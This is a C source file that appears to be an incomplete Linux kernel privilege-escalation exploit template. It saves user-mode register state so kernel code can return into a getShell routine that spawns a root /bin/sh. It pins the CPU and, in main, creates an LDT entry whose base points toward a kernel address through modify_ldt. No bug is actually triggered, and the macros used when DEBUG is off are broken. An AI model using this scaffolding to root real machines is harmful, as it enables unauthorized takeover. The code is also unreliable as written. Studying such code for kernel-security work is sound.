#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <signal.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <fcntl.h>
#include <sched.h>
#include <stdint.h>

#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <sys/msg.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <sys/shm.h>

#include <linux/btrfs.h>
#include <linux/userfaultfd.h>
#include <linux/sysctl.h>
#include <linux/capability.h>
#include <linux/types.h>

#include  <asm/ldt.h>

typedef uint8_t u8;
typedef uint16_t u16;
typedef uint32_t u32;
typedef uint64_t u64;

typedef int8_t i8;
typedef int16_t i16;
typedef int32_t i32;
typedef int64_t i64;

#define DEBUG
#ifdef DEBUG

#define logOK(msg, ...) dprintf(STDERR_FILENO, "[+] " msg "\n", ##__VA_ARGS__)
#define logInfo(msg, ...) dprintf(STDERR_FILENO, "[*] " msg "\n", ##__VA_ARGS__)
#define logErr(msg, ...) dprintf(STDERR_FILENO, "[!] " msg "\n", ##__VA_ARGS__)
#else
#define errExit(...) \
    do               \
    {                \
    } while (0)

#define WAIT(...) errExit(...)
#define logOK(...) errExit(...)
#define logInfo(...) errExit(...)
#define logErr(...) errExit(...)
#endif

#define asm __asm__

u64 user_ip;
u64 user_cs;
u64 user_rflags;
u64 user_sp;
u64 user_ss;

u8 WAIT()
{
    write(STDERR_FILENO, "[WAITING...]\n", 13);
    u8 c;
    read(STDIN_FILENO, &c, 1);
    return c;
}

static inline void panic(const char* msg)
{
    perror(msg);
    exit(EXIT_FAILURE);
}

void getShell()
{
    if (getuid())
    {
        panic("NO ROOT");
    }
    logOK("Rooted!");
    char* argv[] = { "/bin/sh", NULL };
    char** envp = &argv[1];
    execve(argv[0], argv, envp);
}

void save_state()
{
    __asm__(
        "mov [rip + user_cs], cs\n"
        "mov [rip + user_ss], ss\n"
        "mov [rip + user_sp], rsp\n"
        "mov [rip + user_ip], %0\n"
        "pushf\n"
        "pop qword ptr [rip + user_rflags]\n" ::"r"(getShell));
    logInfo("Saved user state");
}

void pin_cpu(int cpu)
{
    cpu_set_t cpu_set;
    CPU_ZERO(&cpu_set);
    CPU_SET(cpu, &cpu_set);
    if (sched_setaffinity(0, sizeof(cpu_set), &cpu_set) != 0)
    {
        panic("sched_setaffinity");
    }
}

int modify_ldt(int func, void* ptr, unsigned long bytecount) {
    return syscall(SYS_modify_ldt, func, ptr, bytecount);
}

struct user_desc_ {
    uint32_t entry_number;
    uint32_t base_addr;
    uint32_t limit;
    uint32_t seg_32bit : 1;
    uint32_t contents : 2;
    uint32_t read_exec_only : 1;
    uint32_t limit_in_pages : 1;
    uint32_t seg_not_present : 1;
    uint32_t useable : 1;
#ifdef __x86_64__
    uint32_t lm : 1;
#endif
    uint32_t base_addr_high;
};


int main(int argc, char** argv, char** envp)
{
    struct user_desc ldt_entry;
    memset(&ldt_entry, 0, sizeof(ldt_entry));

    // Set up the LDT entry with the desired base address
    ldt_entry.entry_number = 0;
    ldt_entry.base_addr = 0xFFFF8800; // Lower 32 bits of the base address
    // /ldt_entry.base_addr_high = 0xFFFF8800; // Upper 32 bits of the base address
    ldt_entry.limit = 0xFFFFF; // 4 GB limit
    ldt_entry.seg_32bit = 1; // 32-bit segment
    ldt_entry.contents = 0; // Data segment
    ldt_entry.read_exec_only = 0; // Read/Write
    ldt_entry.limit_in_pages = 1; // Limit is in 4k pages
    ldt_entry.seg_not_present = 0; // Segment is present
    ldt_entry.useable = 1; // Segment is useable

#ifdef __x86_64__
    ldt_entry.lm = 1; // Long mode
#endif

    if (modify_ldt(1, &ldt_entry, sizeof(ldt_entry)) < 0) {
        perror("modify_ldt");
        exit(EXIT_FAILURE);
    }

    printf("LDT entry created successfully.\n");
    getchar();

    return 0;
}